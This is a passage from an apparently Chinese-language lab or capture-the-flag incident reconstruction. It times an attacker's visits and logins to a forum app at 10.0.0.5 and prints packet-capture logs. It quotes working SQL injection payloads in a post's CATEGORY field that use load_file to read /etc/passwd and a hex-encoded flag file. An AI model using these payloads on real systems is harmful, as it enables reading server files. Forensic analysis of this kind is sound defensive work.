src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

28:

1. 数次访问登录页面：2023.04.19 14:36:00,14:36:06,14:36:28,14:34:44,14:37:00,14:37:15,14:37:22,14:38:21,14:41:38,14:41:48

2. （成功动作）使用正确密码登录，时间04.19：14:41:57,14:42:46，04.20：09:14:26

3. （成功动作）利用SQL注入，在发帖的CATEGORY内容中插入如下字符串："',content=(select load_file('//etc/passwd')),/*"，该过程重复了多次，第一次获取时间09:24:07，最后一次获取时间09:33:13

   （第一次获取对应的日志）

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Thu, 20 Apr 2023 09:16:03 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1703", "http.content_length_header_tree": {"http.content_length": "1703"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "44", "http.time": "0.003329000", "http.prev_request_in": "10022485", "http.prev_response_in": "10022490", "http.request_in": "10022531", "http.response_for.uri": "http://10.0.0.5/index.php", "Content-encoded entity body (gzip): 1703 bytes -> 7748 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>2</td><td class='AutoNewline'>2</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>2</td><td class='AutoNewline'>',content=(select load_file('//etc/passwd')),/*</td><td class='AutoNewline'>233</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='2'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

4. 成功动作）利用SQL注入，在发帖的CATEGORY内容中插入如下字符串:"1', content=(select hex(load\_file('/var/www/html/flag\_8946e1ff1ee3e40f.php'))),/*"，时间为09:33:30,09:35:09，重新读帖获取flag，分别在09:33:42,09:35:55。

   （第一次注入的日志）

   ```
   {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Thu, 20 Apr 2023 09:33:30 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.content_encoding": "gzip", "http.content_length_header": "1762", "http.content_length_header_tree": {"http.content_length": "1762"}, "http.connection": "close", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "157", "http.time": "0.006877000", "http.prev_request_in": "10147097", "http.prev_response_in": "10147100", "http.request_in": "10147266", "http.response_for.uri": "http://10.0.0.5/index.php", "Content-encoded entity body (gzip): 1762 bytes -> 8148 bytes": "", "http.file_data": "<!doctype html>\n<html class=\"no-js\" lang=\"\">\n\n<head>\n\n    <meta charset=\"utf-8\">\n    <meta name=\"description\" content=\"\">\n    <meta name=\"viewport\" content=\"width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1\">\n\n    <title>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</title>\n\n<style type=\"text/css\"> \n.AutoNewline \n{ \n  Word-break: break-all;\n} \n</style>\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-select/bootstrap-select.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/dropzone/dropzone.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/slider/slider.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/bootstrap-datepicker/datepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/timepicker/jquery.timepicker.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/offline/theme.css\">\n    <link rel=\"stylesheet\" href=\"/vendor/pace/theme.css\">\n\n\n    <link rel=\"stylesheet\" href=\"/bootstrap/css/bootstrap.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/font-awesome.min.css\">\n    <link rel=\"stylesheet\" href=\"/css/animate.min.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/panel.css\">\n\n    <link rel=\"stylesheet\" href=\"/css/skins/palette.1.css\" id=\"skin\">\n    <link rel=\"stylesheet\" href=\"/css/fonts/style.1.css\" id=\"font\">\n    <link rel=\"stylesheet\" href=\"/css/main.css\">\n\n    <script src=\"/vendor/modernizr.js\"></script>\n</head>\n\n<body>\n   <div class=\"app\">\n            <section class=\"main-content\">\n                <div class=\"content-wrap\">\n                    <div class=\"row\">\n                        <div class=\"col-lg-12\">\n                                <section class=\"panel\">\n                                <header class=\"panel-heading\"><font><font><b>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</b></font></font></header>\n                                <div class=\"panel-body\">\n                                    <form method=\"post\">\n                                    <div class=\"demo-button\">\n                                    <button type=\"button\" class=\"btn btn-success\" data-toggle=\"modal\" data-target=\"#addmodal\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                                    </div>\n                                    </form>\n                                </div>\n                                <li class=\"table_line\"></li>\n                                <div class=\"panel-group\" id=\"accordion\">\n                                    <div class=\"panel\">\n                                            <div class=\"panel-body\">\n                                            <table class=\"table table-striped no-margin\">\n                                            <thead>\n                                            <tr>\n                                                <th class=\"col-lg-1\">ID</th>\n                                                <th class=\"col-lg-5\">CATEGORY</th>\n                                                <th class=\"col-lg-5\">TITLE</th>\n                                                <th class=\"col-lg-1\"></th>\n                                            </tr>\n                                            </thead>\n                                            <tbody>\n                                \n<tr><td>1</td><td class='AutoNewline'>2</td><td class='AutoNewline'>2</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='1'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>2</td><td class='AutoNewline'>',content=(select load_file('//etc/passwd')),/*</td><td class='AutoNewline'>233</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='2'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr><tr><td>3</td><td class='AutoNewline'>1', content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/*</td><td class='AutoNewline'>9</td>\n          <td>\n          <form method='get' action='./comment.php'>\n          <input hidden name='id' value='3'>\n          <button class='btn btn-danger btn-xs' type='submit'>\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>      \n          </form>\n          </td>\n         </tr>                                            </tbody>\n                                            </table>\n                                            </div>\n                                    </div>\n                                </div>\n                            </section>\n        </div>\n        </div>\n        </div>\n</section>\n<div class=\"modal fade bs-modal-md\" id=\"addmodal\" tabindex=\"-1\" role=\"dialog\" aria-hidden=\"true\">\n    <div class=\"modal-dialog modal-md\">\n        <div class=\"modal-content\">\n            <div class=\"modal-header\">\n                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">&times;</button>\n                <h5 class=\"modal-title text-center\" id=\"myModalLabel\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</h5>\n            </div>\n            <div class=\"modal-body\">\n                        <form class=\"form-horizontal bordered-group\" role=\"form\" action=\"./write_do.php?do=write\" method=\"post\" onsubmit=\"return submit_check()\">\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">TITLE</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"title\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CATEGORY</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"category\">\n                                </div>\n                            </div>\n                            <div class=\"form-group\">\n                                <label class=\"col-sm-2 control-label\">CONTENT</label>\n                                <div class=\"col-sm-5\">\n                                <input type=\"text\" class=\"form-control\" name=\"content\">\n                                </div>\n                            </div>\n                            <div class=\"modal-footer\">\n                                <button type=\"submit\" class=\"btn btn-primary btn-sm\">\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd</button>\n                            </div>\n                        </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n</div>\n    <script src=\"/vendor/jquery-1.11.1.min.js\"></script>\n    <script src=\"/bootstrap/js/bootstrap.js\"></script>\n    <script src=\"/vendor/jquery.easing.min.js\"></script>\n    <script src=\"/vendor/jquery.placeholder.js\"></script>\n    <script src=\"/vendor/fastclick.js\"></script>\n\n\n    <script src=\"/vendor/bootstrap-select/bootstrap-select.js\"></script>\n    <script src=\"/vendor/dropzone/dropzone.js\"></script>\n    <script src=\"/vendor/parsley.min.js\"></script>\n    <script src=\"/vendor/fuelux/checkbox.js\"></script>\n    <script src=\"/vendor/fuelux/radio.js\"></script>\n    <script src=\"/vendor/fuelux/wizard.js\"></script>\n    <script src=\"/vendor/fuelux/pillbox.js\"></script>\n    <script src=\"/vendor/fuelux/spinner.js\"></script>\n    <script src=\"/vendor/slider/bootstrap-slider.js\"></script>\n    <script src=\"/vendor/bootstrap-datepicker/bootstrap-datepicker.js\"></script>\n    <script src=\"/vendor/wysiwyg/jquery.hotkeys.js\"></script>\n    <script src=\"/vendor/wysiwyg/bootstrap-wysiwyg.js\"></script>\n    <script src=\"/vendor/switchery/switchery.js\"></script>\n    <script src=\"/vendor/timepicker/jquery.timepicker.js\"></script>\n    <script src=\"/vendor/offline/offline.min.js\"></script>\n    <script src=\"/vendor/pace/pace.min.js\"></script>\n\n    <script src=\"/vendor/jquery.slimscroll.js\"></script>\n    <script src=\"/js/off-canvas.js\"></script>\n    <script src=\"/js/main.js\"></script>\n\n    <script src=\"/js/panel.js\"></script>\n    <script src=\"/js/forms.js\"></script>\n<script language=\"javascript\">  \nfunction submit_check(){\n    var gnl=confirm(\"\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd?\");\n    if (gnl==true){\n        return true;\n    }\n    else{\n        return false;\n    }\n    }\n</script> \n\n</body>\n</html>\n"}
   ```

5. 